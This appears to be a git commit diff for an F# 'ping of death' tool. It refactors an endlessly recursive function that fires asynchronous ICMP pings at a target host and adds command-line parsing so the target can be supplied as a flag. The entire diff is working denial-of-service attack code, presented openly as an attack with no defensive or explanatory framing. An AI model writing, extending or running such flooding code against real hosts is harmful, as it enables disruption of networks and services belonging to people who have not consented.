ed1c59aa20927df73b83f85d0eea7bed826ebfb2
Kied T L <eli.georgios@gmail.com>
2019-02-21 14:12:34 -0500

    Add support for flags to ping of death attack

--- lib/pinglib.fs
+++ lib/pinglib.fs
@@ -9,11 +9,18 @@ open System.Net
 open System.Text
 open System.Net.NetworkInformation
 
+open CommandLine
+open CommandLine.Text
+
 module pinglib =
     let nil : string = string (char 0x00)
     let data : string = File.ReadAllText((System.Reflection.Assembly.GetEntryAssembly().Location))
 
-    let rec attackp (nth : int) (host : string)  =
+    type options = {
+        [<Option('d', "host", Required = true)>] host : string;
+    }
+
+    let rec send (nth : int) (host : string)  =
         let pingSender : Ping = new Ping()
         let options : PingOptions = new PingOptions()
 
@@ -22,4 +29,18 @@ module pinglib =
         let timeout : int = 120
         pingSender.SendAsync(host, 10000000, buffer, options) |> ignore
         verbose ("pinged -> " + host + " " + (nth.ToString()) + " times")
-        attackp (nth + 1) host
+        send (nth + 1) host
+
+    let attackp (args : string[]) =
+        let mutable param = Parser.Default.ParseArguments<options>(args)
+        let mutable opt : options = Unchecked.defaultof<options>
+
+        match param with
+            | :? Parsed<options> as parsed ->
+                opt <- parsed.Value
+            | :? NotParsed<options> as notParsed ->
+                errorfn ("300 invalid options. " + (**notParsed.Errors.[0] +**) "fatal.")
+                exit 1
+
+        let host = opt.host
+        send 1 host 
